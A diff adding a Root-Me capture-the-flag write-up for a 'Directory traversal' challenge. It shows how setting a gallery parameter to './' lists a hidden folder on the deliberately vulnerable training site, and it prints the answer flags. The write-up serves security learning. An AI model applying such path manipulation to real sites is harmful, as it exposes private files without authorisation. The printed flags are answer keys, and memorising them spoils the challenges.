@@ -25,7 +25,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 17. [HTTP - Cookies](#http-cookies) 🗸
 18. [Insecure Code Management](#insecure-code-management) 🗸
 19. [JSON Web Token (JWT) - Introduction](#json-web-token-jwt-introduction) 🗸
-20. [Directory traversal](#directory-traversal)
+20. [Directory traversal](#directory-traversal) 🗸
 21. [File upload - Null byte](#file-upload-null-byte)
 22. [JSON Web Token (JWT) - Weak secret](#json-web-token-jwt-weak-secret)
 23. [JWT - Revoked token](#jwt-revoked-token)
@@ -1992,6 +1992,159 @@ Entering this into the cookie on the guest page takes us to the admin page and g
 
 ~~~
 S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7 
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+
+## Directory traversal
+
+- Author: g0uZ
+- Date: 31 July 2011
+- Points: 20
+- Level: 2
+
+### Statement
+
+Find the hidden section of the photo galery.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch15/ch15.php).
+
+### Resources
+
+1. [A Case of Directory Traversal](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20A%20Case%20of%20directory%20traversal.pdf).
+2. [BlackHat US 2011 DotDotPwn directory traversal fuzzer](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20BlackHat%20US%202011%20DotDotPwn%20directory%20traversal%20fuzzer.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We can visit the website and view the source code:
+
+~~~html
+<html>
+
+<body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+    <h1>Photo gallery v 0.01</h1><span id="mnenu" />&nbsp;|&nbsp;<span><a href="?galerie=emotes">emotes</a></span>&nbsp;|&nbsp;<span><a href="?galerie=apps"><b>apps</b></a></span>&nbsp;|&nbsp;<span><a href="?galerie=devices">devices</a></span>&nbsp;|&nbsp;<span><a href="?galerie=categories">categories</a></span>&nbsp;|&nbsp;<span><a href="?galerie=actions">actions</a></span>&nbsp;|</span><span style='text-align: right; float:right;'>Connected as : <b>guest</b></span><br/>
+    <hr/>
+    <table id="content">
+        <tr>
+            <td><img width="64px" height="64px" src="galerie/apps/preferences-desktop-screensaver.png" alt="preferences-desktop-screensaver.png"></td>
+        </tr>
+        <tr>
+            <td><img width="64px" height="64px" src="galerie/apps/krita.png" alt="krita.png"></td>
+            <td><img width="64px" height="64px" src="galerie/apps/graphics-viewer-document.png" alt="graphics-viewer-document.png"></td>
+            <td><img width="64px" height="64px" src="galerie/apps/kexi.png" alt="kexi.png"></td>
+        </tr>
+        <tr>
+            <td><img width="64px" height="64px" src="galerie/apps/kthesaurus.png" alt="kthesaurus.png"></td>
+            <td><img width="64px" height="64px" src="galerie/apps/plasmagik.png" alt="plasmagik.png"></td>
+            <td><img width="64px" height="64px" src="galerie/apps/showfoto.png" alt="showfoto.png"></td>
+            <td><img width="64px" height="64px" src="galerie/apps/utilities-terminal.png" alt="utilities-terminal.png"></td>
+        </tr>
+        <tr>
+            <td><img width="64px" height="64px" src="galerie/apps/preferences-desktop-user-password.png" alt="preferences-desktop-user-password.png"></td>
+        </tr>
+    </table>
+</body>
+
+</html>
+~~~
+
+Changing galleries, we can see the URL changes:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=emotes
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=apps
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=devices
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=categories
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=actions
+~~~
+
+We can refer the root to the php and see what is returned:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=./
+~~~
+
+~~~html
+<html>
+
+<body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+    <h1>Photo gallery v 0.01</h1><span id="mnenu" />&nbsp;|&nbsp;<span><a href="?galerie=emotes">emotes</a></span>&nbsp;|&nbsp;<span><a href="?galerie=apps">apps</a></span>&nbsp;|&nbsp;<span><a href="?galerie=devices">devices</a></span>&nbsp;|&nbsp;<span><a href="?galerie=categories">categories</a></span>&nbsp;|&nbsp;<span><a href="?galerie=actions">actions</a></span>&nbsp;|</span><span style='text-align: right; float:right;'>Connected as : <b>guest</b></span><br/>
+    <hr/>
+    <table id="content">
+        <tr>
+            <td><img width="64px" height="64px" src="galerie/.//86hwnX2r" alt="86hwnX2r"></td>
+        </tr>
+        <tr>
+            <td><img width="64px" height="64px" src="galerie/.//emotes" alt="emotes"></td>
+            <td><img width="64px" height="64px" src="galerie/.//apps" alt="apps"></td>
+            <td><img width="64px" height="64px" src="galerie/.//devices" alt="devices"></td>
+        </tr>
+        <tr>
+            <td><img width="64px" height="64px" src="galerie/.//categories" alt="categories"></td>
+            <td><img width="64px" height="64px" src="galerie/.//actions" alt="actions"></td>
+        </tr>
+    </table>
+</body>
+
+</html>
+~~~
+
+The hidden gallery is 86hwnX2r...
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php?86hwnX2r
+~~~
+
+This gives us the hidden gallery:
+
+~~~html
+<html>
+
+<body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+    <h1>Photo gallery v 0.01</h1><span id="mnenu" />&nbsp;|&nbsp;<span><a href="?galerie=emotes">emotes</a></span>&nbsp;|&nbsp;<span><a href="?galerie=apps">apps</a></span>&nbsp;|&nbsp;<span><a href="?galerie=devices">devices</a></span>&nbsp;|&nbsp;<span><a href="?galerie=categories">categories</a></span>&nbsp;|&nbsp;<span><a href="?galerie=actions">actions</a></span>&nbsp;|</span><span style='text-align: right; float:right;'>Connected as : <b>guest</b></span><br/>
+    <hr/>
+    <table id="content">
+        <tr></tr>
+        <tr>
+            <td><img width="64px" height="64px" src="galerie/86hwnX2r/password.txt" alt="password.txt"></td>
+            <td><img width="64px" height="64px" src="galerie/86hwnX2r/hacked_web.jpg" alt="hacked_web.jpg"></td>
+            <td><img width="64px" height="64px" src="galerie/86hwnX2r/secret.png" alt="secret.png"></td>
+        </tr>
+        <tr></tr>
+    </table>
+</body>
+
+</html>
+~~~
+
+We can see the password.txt file; opening this gives us the solution.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+kcb$!Bx@v4Gs9Ez 
 ~~~
 
 </details>
